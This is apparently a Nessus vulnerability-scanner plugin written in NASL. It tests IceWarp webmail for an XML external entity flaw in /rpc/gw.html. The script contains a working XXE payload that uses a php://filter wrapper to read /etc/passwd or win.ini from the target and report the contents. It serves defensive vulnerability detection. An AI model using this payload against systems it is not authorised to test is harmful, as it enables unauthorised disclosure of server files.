#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(68983);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 21:08:40 $");

  script_bugtraq_id(60755);
  script_osvdb_id(94543);

  script_name(english:"IceWarp /rpc/gw.html XML External Entity Arbitrary File Disclosure");
  script_summary(english:"Attempts to view arbitrary files");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is affected by an XML
external entity injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of IceWarp installed on the remote host is affected by an
XML external entity injection (XXE) vulnerability that can lead to the
disclosure of arbitrary data.  A remote, unauthenticated attacker may be
able to view arbitrary files on the remote host by sending a specially
crafted POST request to the '/rpc/gw.html' script. 

Note that the application is reportedly also affected by an additional
XML external entity vulnerability in the '/rpc/api.html' script. 
Additionally, the application is reportedly affected by multiple
cross-site scripting vulnerabilities; however, Nessus has not tested for
these additional issues."
  );
  # https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130625-0_IceWarp_Mail_Server_Multiple_Vulnerabilities_v10.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e47e4d75");
  # http://esupport.icewarp.com/index.php?/default_import/Knowledgebase/Article/View/433/0/vulnerabilities-in-icewarp-server-1045
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4c7d086b");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 10.4.5-1 or apply the workaround as referenced in
the vendor's KB article."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/06/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/06/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/07/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:icewarp:webmail");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("icewarp_webmail_detect.nasl");
  script_require_keys("www/icewarp_webmail");
  script_require_ports("Services/www", 32000, 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:32000);
installed = get_kb_item_or_exit("www/icewarp_webmail");

dir = '';
install_url = build_url(port:port, qs:dir);

url = dir + '/rpc/gw.html';
res = http_send_recv3(
  method : "GET",
  item   : url,
  port   : port,
  exit_on_fail : TRUE
);

if ('Invalid XML request' >!< res[2]) audit(AUDIT_WEB_APP_NOT_AFFECTED, "IceWarp", install_url);

# Grab session
session_id = '';
xml_sess = '<?xml version="1.0"?>' + '\n'+
           '<methodCall>' + '\n' +
           '  <methodName>LoginUser</methodName>' + '\n' +
           '  <params>' + '\n' +
           '    <param><value></value></param>' + '\n' +
           '  </params>' + '\n' +
           '</methodCall>';

res = http_send_recv3(
  method : "POST",
  item   : url,
  port   : port,
  data   : xml_sess,
  add_headers  : make_array("Content-Type", "text/xml",
                            "Content-Length", strlen(xml_sess)
  ),
  exit_on_fail : TRUE
);

match = eregmatch(
  pattern : "\<methodResponse\>\<params\>\<param\>\<value\>([^<]+)\<",
  string  : res[2]
);
if (isnull(match))
  exit(1,"Failed to extract session id from IceWarp install at "+install_url+".");

session_id = match[1];


# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('C:/windows/win.ini','C:/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', 'C:/windows/win.ini', 'C:/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['C:/winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['C:/windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

vuln = FALSE;

foreach file (files)
{
  # Injection attack payload
  xml = '<?xml version="1.0"?>' + '\n' +
    '<!DOCTYPE nessus [<!ENTITY nasl SYSTEM "php://filter/read=convert'+
    '.base64-encode/resource=' + file + '">]>' + '\n' +
    '<methodCall>' + '\n' +
    '  <methodName>ConvertVersit</methodName>' + '\n' +
    '  <params>' + '\n' +
    '    <param><value>' + session_id + '</value></param>' + '\n' +
    '    <param><value>NESSUS;&nasl;</value></param>' + '\n' +
    '    <param><value>XML</value></param>' + '\n' +
    '  </params>' + '\n' +
    '</methodCall>';

  res2 = http_send_recv3(
    method       : "POST",
    item         : url,
    port         : port,
    data         : xml,
    add_headers  : make_array("Content-Type", "text/xml",
                              "Content-Length", strlen(xml)
    ),
    exit_on_fail : TRUE
  );

  match2 = eregmatch(
    pattern :"\<methodResponse\>\<params\>\<param\>\<value\> *&lt;NESSUS&gt;([^<]+)&lt;/NESSUS&gt;",
    string  : res2[2]
  );

  output = '';
  if (!isnull(match2))
  {
    output = base64_decode(str:match2[1]);
    if (egrep(pattern:file_pats[file], string:output))
    {
      attack_request = http_last_sent_request();
      vuln = TRUE;
      break;
    }
  }
}

if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "IceWarp", install_url);

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\nNessus was able to exploit the issue to retrieve the contents'+
     '\nof "'+file+'" using the following request :' +
     '\n' +
     '\n' + attack_request +
     '\n';
  if (report_verbosity > 1)
  {
    if (
      !defined_func("nasl_level") ||
      nasl_level() < 5200 ||
      !isnull(get_preference("sc_version"))
    )
    {
      report +=
        '\nThis produced the following truncated output :' +
        '\n' + snip +
        '\n' + beginning_of_response(resp:output, max_lines:'10') +
        '\n' + snip +
        '\n';
      security_warning(port:port, extra:report);
    }
    else
    {
      # Sanitize file names
      if ("/" >< file)file = ereg_replace(pattern:"^.+/([^/]+)$",
        replace:"\1", string:file); 
     
      report += '\nAttached is a copy of the response' + '\n';
      attachments = make_list();
      attachments[0] = make_array();
      attachments[0]["type"] = "text/plain";
      attachments[0]["name"] = file;
      attachments[0]["value"] = chomp(output);
      security_report_with_attachments(
        port  : port,
        level : 2,
        extra : report,
        attachments : attachments
      );
    }
  }
  else security_warning(port:port, extra:report);
}
else security_warning(port);
